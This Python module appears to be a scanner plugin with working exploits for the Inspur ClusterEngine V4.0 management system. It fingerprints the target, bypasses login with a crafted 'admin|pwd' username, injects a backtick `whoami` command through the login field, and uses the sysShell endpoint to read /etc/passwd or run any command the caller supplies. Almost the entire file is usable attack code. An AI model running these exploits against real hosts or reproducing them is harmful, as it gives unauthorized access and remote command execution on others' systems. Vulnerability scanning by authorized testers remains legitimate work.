from .. import requestUtil


import re

import requests
import warnings
import json

session = requests.session()
warnings.filterwarnings("ignore")


def get_nodes(url):
    resp = session.post(url+"/monNodelist?op=getNodeList", verify=False)
    if "node" in resp.text:
        node_info = json.loads(resp.text)
        return (node_info["nodes"])
    else:
        return [""]


def login_test(url):
    resp = session.post(url+"/login", data={"op":"login","username":"admin|pwd","password":""}, verify=False)
    if '"exitcode":0,' in resp.text:
        return True
    else:
        return False

def login_rce_test(url):
    resp = session.post(url + "/login", data={"op": "login", "username": r"1 2\',\'1\'\); `whoami`"}, verify=False)
    if 'root' in resp.text:
        return True
    else:
        return False

def sysShell_rce_test(url,node, cmd=""):
    resp = session.post(url + "/sysShell", data={"op": "doPlease", "node": node, "command": "cat /etc/passwd" if cmd == "" else cmd}, verify=False)
    if cmd == "":
        if 'root:x:0:0:root' in resp.text:
            return node
        else:
            return False
    else:
        return re.findall("<br>(.*)<br>", resp.text)[0].replace("<br>", "\n")



def fingerprint(service):
    try:
        resp = requestUtil.get(service.url)
        if service.port == 8443 and "ClusterEngine V4.0" in resp.text or "module/login/login.html" in resp.text :
            return True
    except:
        pass

def poc(service):
    result = ["", ""]
    try:
        if login_test(service.url):
            result[0] = "浪潮管理系统V4.0未授权"
            result[1] = "未授权登录"
        else:
            return []
        if login_rce_test(service.url):
            result[0] = "浪潮管理系统V4.0RCE"
            result[1] += "<br>登录接口RCE"
        node = get_nodes(service.url)[0]
        specify = ""
        if node and sysShell_rce_test(service.url, node):
            result[0] = "浪潮管理系统V4.0RCE"
            result[1] += "<br>SysShell接口RCE"
            specify = node
        if not "RCE" in result[0]:
            result[2] = "warning"
        return (result, specify)
    except Exception as e:
        print(e)
        return []


